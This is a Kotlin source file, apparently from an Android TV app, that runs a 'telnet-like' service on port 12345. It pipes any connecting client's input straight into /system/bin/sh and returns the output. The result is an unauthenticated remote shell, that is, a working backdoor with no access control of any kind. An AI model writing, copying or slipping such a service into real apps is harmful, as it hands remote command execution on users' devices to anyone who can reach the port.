package com.zlang.tv

import okio.BufferedSource
import okio.BufferedSink
import okio.buffer
import okio.source
import okio.sink
import java.io.IOException
import java.net.ServerSocket
import java.net.Socket

object TelnetLikeService {
    private const val PORT = 12345

    fun start() {
        try {
            ServerSocket(PORT).use { serverSocket ->
                println("Server started on port $PORT")
                while (true) {
                    val socket = serverSocket.accept()
                    Thread { handleClient(socket) }.start()
                }
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
    private fun handleClient(socket: Socket) {
        try {
            // 使用扩展函数替代静态方法
            val source: BufferedSource = socket.source().buffer()
            val sink: BufferedSink = socket.sink().buffer()

            val process = Runtime.getRuntime().exec("/system/bin/sh")
            val processInput = process.outputStream
            val processOutput = process.inputStream.bufferedReader()
            val processError = process.errorStream.bufferedReader()

            // 启动线程将 shell 输出发送到客户端
            Thread {
                try {
                    var line: String?
                    while (processOutput.readLine().also { line = it } != null) {
                        sink.writeUtf8(line + "\n")
                        sink.flush()
                    }
                } catch (e: IOException) {
                    e.printStackTrace()
                }
            }.start()

            // 启动线程将 shell 错误输出发送到客户端
            Thread {
                try {
                    var line: String?
                    while (processError.readLine().also { line = it } != null) {
                        sink.writeUtf8("Error: " + line + "\n")
                        sink.flush()
                    }
                } catch (e: IOException) {
                    e.printStackTrace()
                }
            }.start()

            // 读取客户端输入并发送到 shell
            try {
                var command: String?
                while (source.readUtf8Line().also { command = it } != null) {
                    processInput.write((command + "\n").toByteArray())
                    processInput.flush()
                }
            } catch (e: IOException) {
                e.printStackTrace()
            } finally {
                process.destroy()
                socket.close()
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}